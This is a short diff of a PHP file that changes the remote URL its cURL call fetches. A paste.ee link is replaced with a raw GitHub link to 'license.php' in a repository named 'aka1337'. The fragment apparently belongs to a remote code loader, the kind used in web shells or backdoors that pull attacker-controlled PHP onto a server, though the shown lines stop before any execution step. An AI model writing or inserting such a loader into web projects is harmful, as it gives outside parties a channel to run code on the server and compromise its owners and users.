@@ -1,5 +1,5 @@
 <?php
-$url = "https://paste.ee/r/ZnPm0O2t/0";
+$url = "https://raw.githubusercontent.com/sultankonslet1337/aka1337/refs/heads/main/license.php";
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_HEADER, true);
